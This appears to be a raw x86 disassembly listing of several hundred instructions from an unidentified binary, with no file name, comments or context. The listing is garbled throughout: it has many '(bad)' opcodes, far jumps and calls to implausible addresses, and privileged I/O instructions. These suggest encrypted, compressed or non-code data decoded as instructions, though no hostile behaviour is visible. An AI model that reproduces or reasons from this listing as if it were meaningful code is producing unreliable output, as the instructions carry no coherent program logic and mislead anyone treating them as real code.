  4189c3:	je     0x41898a
  4189c5:	ins    BYTE PTR es:[edi],dx
  4189c6:	jne    0x418998
  4189c8:	sbb    eax,DWORD PTR [eax-0x6a]
  4189cb:	sar    ah,1
  4189cd:	pop    edx
  4189ce:	dec    ecx
  4189cf:	xchg   ecx,eax
  4189d0:	inc    edx
  4189d1:	push   edi
  4189d2:	(bad)  
  4189d3:	(bad)  
  4189d4:	je     0x4189e5
  4189d6:	ds jp  0x41895c
  4189d9:	sar    DWORD PTR [ecx-0x4b3f5a06],0x1b
  4189e0:	adc    al,0x6
  4189e2:	out    0xba,eax
  4189e4:	inc    esp
  4189e5:	nop
  4189e6:	sbb    BYTE PTR [edx],bh
  4189e8:	mov    ah,0x6a
  4189ea:	addr16 dec ebp
  4189ec:	jmp    0x418a45
	...
  418a56:	mov    WORD PTR [ecx-0x28a2e9ac],ss
  418a5c:	into   
  418a5d:	fwait
  418a5e:	add    bh,cl
  418a60:	mov    ebp,0xd421a769
  418a65:	jl     0x418ace
  418a67:	or     DWORD PTR [ecx],eax
  418a69:	add    BYTE PTR [eax],al
  418a6b:	add    DWORD PTR [eax],eax
  418a6d:	add    BYTE PTR [esi+eax*8],cl
  418a70:	and    DWORD PTR [ebx],esi
  418a72:	jnp    0x418aa8
  418a74:	jle    0x418ab0
  418a76:	push   cs
  418a77:	dec    ebx
  418a78:	hlt    
  418a79:	push   ds
  418a7a:	es jb  0x418aae
  418a7d:	or     al,0x14
  418a7f:	fstp   DWORD PTR [edx-0x7a]
  418a82:	push   esi
  418a83:	or     BYTE PTR [edi-0x66],0x38
  418a87:	or     DWORD PTR [ecx-0x51],esp
  418a8a:	clc    
  418a8b:	pusha  
  418a8c:	daa    
  418a8d:	sbb    eax,0xbea30700
  418a92:	mov    edi,0x38d240cb
  418a97:	mov    edi,DWORD PTR [eax]
  418a99:	xchg   ecx,eax
  418a9a:	bnd ret 
  418a9c:	sbb    eax,DWORD PTR [eax+0x28caf81f]
  418aa2:	add    eax,0x3f7a9e7b
  418aa7:	xor    ch,BYTE PTR [edx+0x549128f9]
  418aad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418aae:	daa    
  418aaf:	daa    
  418ab0:	xchg   esi,eax
  418ab1:	addr16 inc edi
  418ab3:	inc    edx
  418ab4:	call   FWORD PTR [edx]
  418ab6:	lods   eax,DWORD PTR ds:[esi]
  418ab7:	aaa    
  418ab8:	lahf   
  418ab9:	inc    edi
  418aba:	or     DWORD PTR [ecx],esp
  418abc:	imul   edx,DWORD PTR ds:0x4c57d67f,0xaf466060
  418ac6:	ins    DWORD PTR es:[edi],dx
  418ac7:	outs   dx,BYTE PTR ds:[esi]
  418ac8:	sub    al,BYTE PTR [edi]
  418aca:	ficom  DWORD PTR [esi-0x3e]
  418acd:	ss pop ecx
  418acf:	mov    bl,0xbe
  418ad1:	xchg   ecx,eax
  418ad2:	jne    0x418a82
  418ad4:	aas    
  418ad5:	icebp  
  418ad6:	mov    DWORD PTR [esi],esi
  418ad8:	retf   0x30d6
  418adb:	jnp    0x418b3d
  418add:	in     al,dx
  418ade:	push   edx
  418adf:	mov    ebx,0xbb98d074
  418ae4:	pusha  
  418ae5:	fs pop eax
  418ae7:	inc    esi
  418ae8:	loopne 0x418abf
  418aea:	add    DWORD PTR [ecx],ebp
  418aec:	inc    eax
  418aed:	sub    BYTE PTR [eax+0x4e],0x3b
  418af1:	pop    ds
  418af2:	(bad)  
  418af3:	popa   
  418af4:	nop    DWORD PTR [esi+eax*4-0x3e]
  418af9:	ins    DWORD PTR es:[edi],dx
  418afa:	sbb    BYTE PTR [ebp-0x3a47f279],dh
  418b00:	jae    0x418acd
  418b02:	inc    esi
  418b03:	les    esi,FWORD PTR [edx+0x7273666d]
  418b09:	cli    
  418b0a:	pop    eax
  418b0b:	mov    WORD PTR [ecx+esi*1-0x379d6232],ss
  418b12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b13:	xchg   BYTE PTR [esi+ebp*8],bh
  418b16:	adc    al,0xb1
  418b18:	add    cl,BYTE PTR [edi+0xd]
  418b1b:	pop    edx
  418b1c:	outs   dx,BYTE PTR ds:[esi]
  418b1d:	outs   dx,DWORD PTR ds:[esi]
  418b1e:	repnz fwait
  418b20:	rep lods eax,DWORD PTR ds:[esi]
  418b22:	adc    eax,0x831fd0e6
  418b27:	jecxz  0x418b2a
  418b29:	jne    0x418adb
  418b2b:	inc    esp
  418b2c:	cmp    bl,BYTE PTR [ebx]
  418b2e:	sub    DWORD PTR [esi+0xe],ebp
  418b31:	mov    BYTE PTR [ecx-0x639bfd40],dh
  418b37:	xor    DWORD PTR [edx+0x93822ea],ebx
  418b3d:	mov    ch,0x5e
  418b3f:	dec    ebx
  418b40:	push   esp
  418b41:	and    BYTE PTR [esi+ebp*8+0x31],bl
  418b45:	loop   0x418b06
  418b47:	je     0x418ba1
  418b49:	jl     0x418b0d
  418b4b:	daa    
  418b4c:	lahf   
  418b4d:	dec    edx
  418b4e:	pop    edx
  418b4f:	dec    eax
  418b50:	jg     0x418b2c
  418b52:	dec    ecx
  418b53:	enter  0x989a,0xa3
  418b57:	add    al,BYTE PTR [ebp+0x30]
  418b5a:	push   ss
  418b5b:	shl    ebp,1
  418b5d:	aam    0xf3
  418b5f:	call   0xb26a6893
  418b64:	(bad)  
  418b65:	out    dx,eax
  418b66:	(bad)  
  418b67:	adc    BYTE PTR [edi-0x79160710],dl
  418b6d:	adc    BYTE PTR [eax],al
	...
  418bd3:	add    BYTE PTR [eax],al
  418bd5:	add    BYTE PTR [ebx+edx*1-0x7b],bh
  418bd9:	xor    ch,bh
  418bdb:	mov    dh,0xff
  418bdd:	pop    edi
  418bde:	sar    BYTE PTR [ebp+0x3b],1
  418be1:	in     eax,0x57
  418be3:	sbb    BYTE PTR [ebp+0x10a670d],al
  418be9:	add    BYTE PTR [eax],al
  418beb:	add    DWORD PTR [eax],eax
  418bed:	add    BYTE PTR [ebx+0x13],al
  418bf0:	ins    DWORD PTR es:[edi],dx
  418bf1:	int    0x6
  418bf3:	dec    ebp
  418bf4:	cli    
  418bf5:	fucomip st,st(1)
  418bf7:	adc    al,0x46
  418bf9:	popf   
  418bfa:	jae    0x418c08
  418bfc:	cmc    
  418bfd:	mov    eax,ds:0x9403fbab
  418c02:	and    eax,0x127ce93f
  418c07:	mov    WORD PTR [edx-0x6f],ss
  418c0a:	sbb    al,0x7a
  418c0c:	fbstp  TBYTE PTR [ecx+0x4f]
  418c0f:	push   edx
  418c10:	jnp    0x418c37
  418c12:	nop
  418c13:	sub    esi,esi
  418c15:	test   DWORD PTR [eax-0x77173094],ebx
  418c1b:	data16 mov dh,0x4c
  418c1e:	xchg   ebp,eax
  418c1f:	mov    ecx,0xb9856271
  418c24:	or     al,dl
  418c26:	loopne 0x418bdb
  418c28:	mov    eax,0x38627105
  418c2d:	inc    BYTE PTR [edi]
  418c2f:	dec    edx
  418c30:	cdq    
  418c31:	cmc    
  418c32:	enter  0x9d5,0x96
  418c36:	mov    ecx,0x7b32810
  418c3b:	jo     0x418c5b
  418c3d:	jl     0x418c9b
  418c3f:	mov    dh,0x55
  418c41:	call   0xa3ed:0x252d36db
  418c48:	and    eax,0x58c5278e
  418c4d:	push   ecx
  418c4e:	sub    eax,0xcec4b500
  418c53:	fldenv [ecx-0x75006de4]
  418c59:	cli    
  418c5a:	mov    dh,0xc1
  418c5c:	es into 
  418c5e:	xlat   BYTE PTR ds:[ebx]
  418c5f:	lahf   
  418c60:	push   es
  418c61:	mov    bl,0xe3
  418c63:	mov    ch,0x32
  418c65:	jae    0x418c5a
  418c67:	cmp    dl,BYTE PTR [esi-0x1c]
  418c6a:	js     0x418c01
  418c6c:	sub    dl,al
  418c6e:	mov    bl,0xe5
  418c70:	or     DWORD PTR [edx],ecx
  418c72:	shl    bl,cl
  418c74:	mov    ah,0x29
  418c76:	jmp    0xdab1:0x79536fdf
  418c7d:	xchg   ebx,eax
  418c7e:	rcl    ebp,1
  418c80:	lea    edi,[esi-0x339f508e]
  418c86:	in     al,0x91
  418c88:	mov    dx,0x608
  418c8c:	adc    bl,BYTE PTR [esp+eax*8+0xe]
  418c90:	scas   al,BYTE PTR es:[edi]
  418c91:	mov    BYTE PTR [edi+0x30f97994],cl
  418c97:	jecxz  0x418c21
  418c99:	in     al,dx
  418c9a:	retf   0x626b
  418c9d:	cmp    eax,0x1e85a70c
  418ca2:	sahf   
  418ca3:	int3   
  418ca4:	in     al,0x2d
  418ca6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ca8:	push   esi
  418ca9:	xlat   BYTE PTR ds:[ebx]
  418caa:	and    BYTE PTR [esp+edi*8+0x47c8404b],0x24
  418cb2:	cli    
  418cb3:	ror    BYTE PTR [edi+0x2b8b2240],0x66
  418cba:	nop
  418cbb:	pop    edi
  418cbc:	adc    eax,esp
  418cbe:	xor    al,0xd0
  418cc0:	pop    ebx
  418cc1:	clc    
  418cc2:	push   ebp
  418cc3:	or     BYTE PTR [ebx],0x36
  418cc6:	aaa    
  418cc7:	iret   
  418cc8:	outs   dx,DWORD PTR ds:[esi]
  418cc9:	sbb    DWORD PTR [eax+0x68],ebx
  418ccc:	pushf  
  418ccd:	(bad)  
  418ccf:	add    cl,dh
  418cd1:	mov    ebp,0x4448d8d4
  418cd6:	cmp    al,0xd0
  418cd8:	cmc    
  418cd9:	pop    esi
  418cda:	xlat   BYTE PTR ds:[ebx]
  418cdb:	pop    esp
  418cdc:	mov    dh,0x32
  418cde:	pop    esi
  418cdf:	jbe    0x418c92
  418ce1:	pop    ebx
  418ce2:	lea    edx,[ecx+0x63]
  418ce5:	xor    eax,0xf0715e94
  418cea:	jnp    0x418ca6
  418cec:	jno    0x418c8a
	...
  418d56:	sti    
  418d57:	inc    edx
  418d58:	out    dx,al
  418d59:	aas    
  418d5a:	(bad)  
  418d5b:	mov    edi,0x6a1ac6fb
  418d60:	(bad)  
  418d61:	rcr    BYTE PTR [edx+0x46],cl
  418d64:	push   ds
  418d65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d66:	or     eax,DWORD PTR [bx+di]
  418d69:	add    BYTE PTR [eax],al
  418d6b:	add    DWORD PTR [eax],eax
  418d6d:	add    BYTE PTR [ebp-0x7e6a7fde],ah
  418d73:	shl    BYTE PTR [eax],1
  418d75:	cmp    edx,esi
  418d77:	inc    edx
  418d78:	ja     0x418d63
  418d7a:	sbb    ebp,DWORD PTR [esi-0x6c]
  418d7d:	scas   al,BYTE PTR es:[edi]
  418d7e:	cmp    edx,DWORD PTR [edx+eax*8]
  418d81:	push   esi
  418d82:	adc    eax,DWORD PTR [ecx+0x431899ee]
  418d88:	xchg   ebp,eax
  418d89:	pop    eax
  418d8a:	inc    edx
  418d8b:	mov    bh,BYTE PTR [edi+0x24]
  418d8e:	push   ds
  418d8f:	inc    edi
  418d90:	bound  eax,QWORD PTR [ebp+0x2e]
  418d93:	rcr    DWORD PTR [ebx+0x21f0ff1e],cl
  418d99:	(bad)  
  418d9b:	mov    ah,0xea
  418d9d:	pop    esp
  418d9e:	or     DWORD PTR [edi-0x3db0db3f],0xffffff93
  418da5:	add    eax,DWORD PTR [esi-0x2091de7b]
  418dab:	jne    0x418d8b
  418dad:	add    eax,0xd6ef3af
  418db2:	iret   
  418db3:	fld    DWORD PTR [ebp+0x75]
  418db6:	imul   BYTE PTR [ebx+0x6f]
  418db9:	pop    ebx
  418dba:	or     DWORD PTR [eax-0xf],esp
  418dbd:	jae    0x418d45
  418dbf:	or     eax,0xe3f525e3
  418dc4:	cmp    ch,BYTE PTR [edx+0x10]
  418dc7:	in     eax,0xb0
  418dc9:	add    cl,cl
  418dcb:	sub    DWORD PTR [eax-0x29],0xb30010ba
  418dd2:	enter  0x565b,0x6a
  418dd6:	sahf   
  418dd7:	ror    DWORD PTR [ebx-0x1],1
  418dda:	retf   0x9045
  418ddd:	iret   
  418dde:	add    eax,0x534116b1
  418de3:	shl    DWORD PTR [ebp*1-0x49e6204c],cl
  418dea:	jae    0x418d7b
  418dec:	inc    ebp
  418ded:	push   ecx
  418dee:	out    dx,eax
  418def:	inc    edx
  418df0:	add    BYTE PTR [edx],bl
  418df2:	call   0x75bc:0xbec25963
  418df9:	ins    BYTE PTR es:[edi],dx
  418dfa:	xchg   ebp,eax
  418dfb:	mov    eax,0x793b7492
  418e00:	pop    ecx
  418e01:	push   ebp
  418e02:	sub    edi,DWORD PTR [ebx-0x20]
  418e05:	push   edx
  418e06:	mov    ds:0xe956c94c,al
  418e0b:	(bad)
  418e0f:	bound  edi,QWORD PTR [eax+eiz*4-0x4555dc93]
  418e16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e17:	enter  0x846d,0xba
  418e1b:	daa    
  418e1c:	pop    ebx
  418e1d:	in     eax,0x23
  418e1f:	pop    ss
  418e20:	scas   eax,DWORD PTR es:[edi]
  418e21:	mov    es,ebp
  418e23:	pop    eax
  418e24:	push   esi
  418e25:	shr    BYTE PTR [ecx],0xac
  418e28:	inc    ebx
  418e29:	xor    ecx,edi
  418e2b:	pop    esi
  418e2c:	sbb    cl,BYTE PTR [edx]
  418e2e:	ficomp DWORD PTR [ecx-0x612fd535]
  418e34:	inc    esp
  418e35:	in     al,0x9
  418e37:	arpl   bx,sp
  418e39:	cmp    eax,0xe07bf6dc
  418e3e:	push   eax
  418e3f:	retf   0x4bd0
  418e42:	sbb    edx,DWORD PTR [eax+0x2fc7b148]
  418e48:	and    ecx,eax
  418e4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e4b:	rcl    cl,0x70
  418e4e:	cmp    al,ah
  418e50:	push   edi
  418e51:	add    ebx,esi
  418e53:	rcr    BYTE PTR [ebp-0x6ac23a28],cl
  418e59:	adc    DWORD PTR [edx+0x72472abf],eax
  418e5f:	jo     0x418e14
  418e61:	inc    eax
  418e62:	daa    
  418e63:	aaa    
  418e64:	mov    ebp,0xdf29c16e
  418e69:	push   ebp
  418e6a:	adc    esi,esi
  418e6c:	mov    esp,0xf3
	...
  418ed5:	add    BYTE PTR [esi],cl
  418ed7:	bnd call 0xde7c8b0d
  418edd:	dec    dl
  418edf:	leave  
  418ee0:	and    ah,BYTE PTR [edx+0x7e]
  418ee3:	nop
  418ee4:	add    DWORD PTR [edi+0x67],ebx
  418ee7:	or     al,0x1
  418ee9:	add    BYTE PTR [eax],al
  418eeb:	add    DWORD PTR [eax],eax
  418eed:	add    BYTE PTR ds:0x3cf34990,al
  418ef3:	xor    DWORD PTR [ecx-0x3ab424cc],edx
  418ef9:	into   
  418efa:	jmp    esi
  418efc:	sbb    BYTE PTR [edi-0x77],0xc7
  418f00:	push   eax
  418f01:	add    al,0x92
  418f03:	enter  0xdaeb,0x7d
  418f07:	scas   al,BYTE PTR es:[edi]
  418f08:	mov    ch,0xd1
  418f0a:	add    ecx,ebp
  418f0c:	jle    0x418ea3
  418f0e:	mov    ebx,0x613a1594
  418f13:	mov    DWORD PTR [ebx+0x5755df55],0xc6b74aef
  418f1d:	fidiv  WORD PTR ds:0x473b530c
  418f23:	adc    BYTE PTR [esi],ah
  418f25:	jl     0x418f44
  418f27:	xor    eax,0x5336d5b6
  418f2c:	xor    BYTE PTR [ebx-0x5f5f1c86],bl
  418f32:	fs scas al,BYTE PTR es:[edi]
  418f34:	inc    ebp
  418f35:	fs jmp 0xcf57:0xf00de6ac
  418f3d:	pusha  
  418f3e:	call   FWORD PTR [ebx]
  418f40:	js     0x418ed2
  418f42:	fst    QWORD PTR [bx+di+0x1d]
  418f46:	push   edx
  418f47:	inc    edx
  418f48:	lds    ebp,FWORD PTR [edi+0x2e]
  418f4b:	call   0x121f:0x3c777882
  418f52:	rcl    BYTE PTR [edi-0xb493b5b],0xa1
  418f59:	pop    eax
  418f5a:	retf   
  418f5b:	(bad)  
  418f5c:	mov    WORD PTR [eax-0x410a3086],es
  418f62:	add    DWORD PTR [edx+0x6f52d863],0xec7f56e0
  418f6c:	mov    dh,0xb7
  418f6e:	test   BYTE PTR [ebx-0x76],0x2a
  418f72:	out    dx,eax
  418f73:	cmp    ah,BYTE PTR [esi+0x5]
  418f76:	das    
  418f77:	inc    eax
  418f78:	icebp  
  418f79:	clc    
  418f7a:	shl    esp,0x29
  418f7d:	inc    edx
  418f7e:	xor    DWORD PTR [esi+0x40],0xcff73c0c
  418f85:	ret    0x5b68
  418f88:	(bad)  
  418f89:	cmc    
  418f8a:	int3   
  418f8b:	cmp    eax,0x26740e7f
  418f90:	cmp    al,0xc9
  418f92:	(bad)  
  418f93:	fdivr  st,st(1)
  418f95:	(bad)  
  418f97:	pop    edi
  418f98:	mov    esp,0x33b22861
  418f9d:	mov    BYTE PTR [esi],al
  418f9f:	add    esp,ebp
  418fa1:	xchg   edx,eax
  418fa2:	popa   
  418fa3:	sub    DWORD PTR [edx-0x49e7ab44],0xfffffff4
  418faa:	dec    ecx
  418fab:	fstp   DWORD PTR [esi]
  418fad:	call   0x2a4:0xdce15435
  418fb4:	cli    
  418fb5:	int    0x8b
  418fb7:	outs   dx,DWORD PTR ds:[esi]
  418fb8:	push   es
  418fb9:	push   ecx
  418fba:	jmp    0x80334016
  418fbf:	pop    es
  418fc0:	into   
  418fc1:	push   edi
  418fc2:	fld    TBYTE PTR [ecx+edi*1-0x49dd97e0]
  418fc9:	pusha  
  418fca:	mov    ?,WORD PTR [ecx-0x16]
  418fcd:	mov    ebp,0x55fbe210
  418fd2:	repz xchg esi,eax
  418fd4:	leave  
  418fd5:	jge    0x418fa1
  418fd7:	adc    dh,0x70
  418fda:	leave  
  418fdb:	sub    edi,DWORD PTR ss:[ebx]
  418fde:	xor    BYTE PTR ds:0xc3d8f2f7,ch
  418fe4:	jns    0x418fdf
  418fe6:	mov    es,WORD PTR [edx]
  418fe8:	cs mov esp,0xe25a3dc9
	...
  419056:	sbb    al,0x97
  419058:	in     al,0x47
  41905a:	out    dx,eax
  41905b:	ja     0x41901c
  41905d:	fild   WORD PTR [ecx+0x68eaf1a7]
  419063:	fs (bad) 
  419066:	addr16 or eax,0x1000001
  41906c:	add    BYTE PTR [eax],al
  41906e:	push   0xffffffb4
  419070:	pop    eax
  419071:	(bad)  
  419072:	pop    edi
  419073:	sar    DWORD PTR [ebx+0xdf37aa],cl
  419079:	and    bh,BYTE PTR ds:[ebx-0x43]
  41907d:	daa    
  41907e:	ret    0xf867
  419081:	mov    esp,0xd64bd7f1
  419086:	mov    BYTE PTR [ecx-0x49],bh
  419089:	pop    esi
  41908a:	sbb    BYTE PTR [esi],ch
  41908c:	pop    ss
  41908d:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41908f:	dec    edx
  419090:	sbb    ah,BYTE PTR [ebx]
  419092:	fstp   TBYTE PTR [edi-0x426e47fe]
  419098:	ins    BYTE PTR es:[edi],dx
  419099:	loope  0x41901d
  41909b:	sub    al,0x58
  41909d:	add    al,BYTE PTR [ebx+ebp*8-0x6e701512]
  4190a4:	pop    es
  4190a5:	mov    esi,DWORD PTR [edx-0x56]
  4190a8:	sbb    edi,ebx
  4190aa:	jecxz  0x4190e2
  4190ac:	(bad)  
  4190ad:	jmp    0x37f0:0x6b9441c7
  4190b4:	inc    eax
  4190b5:	add    eax,0x35dc21cc
  4190ba:	mov    al,0xfb
  4190bc:	fdivr  DWORD PTR [esi*1-0x159e6982]
  4190c3:	pop    ebp
  4190c4:	lods   eax,DWORD PTR ds:[esi]
  4190c5:	mov    bl,0x24
  4190c7:	add    eax,0x165087c
  4190cc:	arpl   WORD PTR [ebx],si
  4190ce:	dec    ecx
  4190cf:	jmp    0x72449039
  4190d4:	lock jl 0x41906b
  4190d7:	mov    eax,ds:0xf817b8d0
  4190dc:	dec    eax
  4190dd:	jecxz  0x419132
  4190df:	and    edx,ebx
  4190e1:	adc    BYTE PTR [edx+0x465cc2f5],al
  4190e7:	cmp    bl,BYTE PTR [ebp-0x6a]
  4190ea:	jmp    0x97f560ae
  4190ef:	fimul  DWORD PTR [edx-0x77]
  4190f2:	cmp    DWORD PTR [edx+0x3c09057b],esp
  4190f8:	sbb    al,0x73
  4190fa:	inc    ecx
  4190fb:	gs inc edi
  4190fd:	sbb    cl,bh
  4190ff:	loop   0x419155
  419101:	fsub   DWORD PTR [esi+0x264e972c]
  419107:	test   al,0x14
  419109:	xchg   DWORD PTR [ebx+eax*4-0x12],edi
  41910d:	mov    esp,DWORD PTR [esi+edx*8]
  419110:	ret    
  419111:	in     eax,0xf7
  419113:	mov    ecx,0x692c4bc4
  419118:	ret    0xc0e8
  41911b:	sub    ebp,ecx
  41911d:	ror    edx,1
  41911f:	pop    ecx
  419120:	call   0xe527acc3
  419125:	add    eax,0x63c9d0a4
  41912a:	loop   0x4190f8
  41912c:	xchg   cx,ax
  41912e:	pop    ss
  41912f:	inc    eax
  419130:	jp     0x4190e3
  419132:	add    BYTE PTR [esi+eiz*2-0x74],0x67
  419137:	xlat   BYTE PTR ds:[ebx]
  419138:	xor    DWORD PTR [ecx+0x2a],edi
  41913b:	les    ebp,FWORD PTR [edx-0x7c734062]
  419141:	out    0xa9,al
  419143:	cmp    eax,0xae182d54
  419148:	sbb    cl,ch
  41914a:	les    ecx,FWORD PTR [esi-0x61]
  41914d:	mov    ds:0x5383d255,eax
  419152:	push   edx
  419153:	push   ecx
  419154:	lds    esi,FWORD PTR [esi+ecx*4-0x41]
  419158:	mov    al,bh
  41915a:	(bad)  
  41915b:	jbe    0x4191b9
  41915d:	cmp    BYTE PTR [edi+0x5],0x35
  419161:	lea    edx,[ebp+0x37e811b]
  419167:	(bad)  
  419168:	mov    eax,0x8c979f28
  41916d:	inc    edi
	...
  4191d6:	scas   eax,DWORD PTR es:[edi]
  4191d7:	test   DWORD PTR [esi-0xa441be],ebx
  4191dd:	in     eax,dx
  4191de:	inc    esi
  4191df:	push   0x4d
  4191e1:	or     ch,BYTE PTR [ecx+0x675fc0a2]
  4191e7:	push   cs
  4191e8:	add    DWORD PTR [eax],eax
  4191ea:	add    BYTE PTR [ecx],al
  4191ec:	add    BYTE PTR [eax],al
  4191ee:	aas    
  4191ef:	repz js 0x419258
  4191f2:	repnz outs dx,BYTE PTR ds:[esi]
  4191f4:	push   0x26
  4191f6:	idiv   DWORD PTR [edi+0x69]
  4191f9:	xor    DWORD PTR ds:0x6a725270,ecx
  4191ff:	jne    0x4191b9
  419201:	add    al,0x74
  419203:	pop    edi
  419204:	fwait
  419205:	arpl   WORD PTR [ecx+0x5b76c787],sp
  41920b:	adc    BYTE PTR [ebx+0x5a7305b6],ah
  419211:	mov    dh,0x6c
  419213:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419214:	mov    al,ds:0xe6d43943
  419219:	push   esp
  41921a:	loopne 0x419274
  41921c:	pop    esi
  41921d:	sahf   
  41921e:	mov    DWORD PTR [eax],edx
  419220:	push   edx
  419221:	repnz or DWORD PTR [edx],esp
  419224:	mov    ds:0xd7899af,eax
  419229:	mov    ?,WORD PTR [ebp+0x278f0180]
  41922f:	mov    ecx,0x8a8309ee
  419234:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419235:	inc    edi
  419236:	or     DWORD PTR [edi-0x64],esp
  419239:	or     al,0xdc
  41923b:	cld    
  41923c:	lea    esp,[ecx+0x28aee296]
  419242:	mov    cl,0x11
  419244:	or     al,0x89
  419246:	push   edi
  419247:	xor    DWORD PTR [eax+edi*1+0x6f4a3dcc],ecx
  41924e:	dec    edi
  41924f:	push   0x91de58f2
  419254:	jno    0x419245
  419256:	mov    al,0xbb
  419258:	(bad)  
  419259:	int3   
  41925a:	stos   BYTE PTR es:[edi],al
  41925b:	cmp    edi,eax
  41925d:	cs repnz inc edx
  419260:	aam    0xe8
  419262:	iret   
  419263:	std    
  419264:	dec    esp
  419265:	test   BYTE PTR ss:[esi-0x2bf8fe29],ch
  41926c:	inc    ebx
  41926d:	inc    esi
  41926e:	retf   0xd8a9
  419271:	call   0x926cf9d8
  419276:	jae    0x41920c
  419278:	test   eax,0xdeb24531
  41927d:	jno    0x419296
  41927f:	scas   eax,DWORD PTR es:[edi]
  419280:	adc    esi,DWORD PTR [esi]
  419282:	mov    dl,0xdd
  419284:	call   0x7834af57
  419289:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41928a:	call   0xf2e47bdf
  41928f:	add    BYTE PTR [ebx+0x2a],0x58
  419293:	adc    BYTE PTR [edi-0x5a9497d2],dl
  419299:	int    0x2
  41929b:	dec    ecx
  41929c:	push   ebx
  41929d:	sahf   
  41929e:	fwait
  41929f:	sub    esp,DWORD PTR [esi+0x6b622090]
  4192a5:	jnp    0x419252
  4192a7:	fistp  WORD PTR [edx-0x5b]
  4192aa:	daa    
  4192ab:	mov    cl,0x4a
  4192ad:	dec    ebp
  4192ae:	and    al,0x49
  4192b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4192b1:	push   ss
  4192b2:	mov    ecx,0xdf580654
  4192b7:	xor    esi,edi
  4192b9:	push   0xffffffe3
  4192bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4192bc:	or     DWORD PTR [edi+0x3],ecx
  4192bf:	pop    es
  4192c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4192c1:	push   ds
  4192c2:	inc    esi
  4192c3:	mov    al,ds:0x547de4cc
  4192c8:	out    0x29,al
  4192ca:	xchg   esp,eax
  4192cb:	inc    ebx
  4192cc:	loope  0x4192bf
  4192ce:	bnd ret 
  4192d0:	inc    edi
  4192d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4192d2:	inc    edx
  4192d3:	or     al,0x91
  4192d5:	jmp    0x41928f
  4192d7:	xor    al,0xa1
  4192d9:	out    dx,al
  4192da:	(bad)  
  4192db:	dec    DWORD PTR [eax+0x7064bde6]
  4192e1:	cmp    eax,0xf9d79b75
  4192e6:	jns    0x41931a
  4192e8:	xchg   DWORD PTR ds:0xe8ebdf15,esp
	...
  419356:	mov    al,ds:0xff33bae7
  41935b:	jg     0x419306
  41935d:	neg    eax
  41935f:	pop    ss
  419360:	daa    
  419361:	inc    edi
  419362:	adc    BYTE PTR [ebp-0x13],0x88
  419366:	sgdtd  [bx+si]
  41936a:	add    BYTE PTR [ecx],al
  41936c:	add    BYTE PTR [eax],al
  41936e:	push   0x25
  419370:	sub    dl,BYTE PTR [eax+0x60]
  419373:	pop    eax
  419374:	sub    eax,0x27d3ee57
  419379:	lock retf 0x725f
  41937d:	and    BYTE PTR [eax-0x473ef506],dh
  419383:	(bad)  
  419384:	clc    
  419385:	sbb    eax,ebp
  419387:	mov    ch,0x76
  419389:	(bad)  
  41938a:	je     0x419347
  41938c:	out    0x19,al
  41938e:	or     al,0xa
  419390:	retf   0x2d8d
  419393:	lods   eax,DWORD PTR ds:[esi]
  419394:	or     DWORD PTR [esp+eiz*8+0x48],eax
  419398:	iret   
  419399:	mov    BYTE PTR [edx-0x24b8c4ce],ch
  41939f:	sub    dl,BYTE PTR [edx]
  4193a1:	sbb    BYTE PTR [edx],dl
  4193a3:	add    BYTE PTR [edi+0x33f178d0],al
  4193a9:	loope  0x4193e4
  4193ab:	fstenv [edx]
  4193ae:	or     al,0x88
  4193b0:	xchg   esi,eax
  4193b1:	ret    
  4193b2:	in     eax,dx
  4193b3:	into   
  4193b4:	scas   al,BYTE PTR es:[edi]
  4193b5:	sub    BYTE PTR [edi],al
  4193b7:	sub    DWORD PTR [edx],ebx
  4193b9:	pop    eax
  4193ba:	mov    dh,0x32
  4193bc:	jmp    0xee1ce943
  4193c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4193c2:	push   eax
  4193c3:	mov    ebp,DWORD PTR [eax+0x4e]
  4193c6:	das    
  4193c7:	in     eax,dx
  4193c8:	jae    0x4193b1
  4193ca:	mov    dh,0xe9
  4193cc:	add    ebx,DWORD PTR [ebp+0x7070b726]
  4193d2:	mov    edi,0x3c7d7aef
  4193d7:	(bad)  
  4193d8:	xchg   esi,eax
  4193d9:	adc    eax,0xb4e05e3
  4193de:	or     BYTE PTR [edx],0x31
  4193e1:	je     0x419388
  4193e3:	lods   al,BYTE PTR ds:[esi]
  4193e4:	xlat   BYTE PTR ds:[ebx]
  4193e5:	adc    al,0x7c
  4193e7:	repnz xchg ebp,eax
  4193e9:	and    eax,0x171f58a6
  4193ee:	inc    ecx
  4193ef:	pop    ds
  4193f0:	jns    0x419445
  4193f2:	repz xor esi,eax
  4193f5:	loope  0x4193b3
  4193f7:	popf   
  4193f8:	dec    ebx
  4193f9:	or     edx,DWORD PTR [eax]
  4193fb:	test   BYTE PTR [ecx+0x15],ch
  4193fe:	sub    bl,0x16
  419401:	xchg   ebp,eax
  419402:	add    BYTE PTR [edx-0x45ccdac4],dl
  419408:	ret    
  419409:	retf   
  41940a:	popa   
  41940b:	push   esp
  41940c:	fwait
  41940d:	jle    0x41946d
  41940f:	in     eax,dx
  419410:	into   
  419411:	imul   ebp,DWORD PTR [ebx-0x48],0x3293dcd5
  419418:	out    dx,al
  419419:	call   ebx
  41941b:	jmp    0x97aca6ec
  419420:	cdq    
  419421:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419422:	push   ss
  419423:	daa    
  419424:	mov    edx,0x706e7708
  419429:	sbb    al,BYTE PTR [esi+ebx*8-0x5f]
  41942d:	mov    BYTE PTR [ebx-0x13790e43],ah
  419433:	into   
  419434:	ins    BYTE PTR es:[edi],dx
  419435:	imul   edx,ecx,0x5e028eaf
  41943b:	call   0xac5f:0x3a18a907
  419442:	xchg   DWORD PTR [eax],esi
  419444:	jmp    0xd9d2:0x7e0ccec2
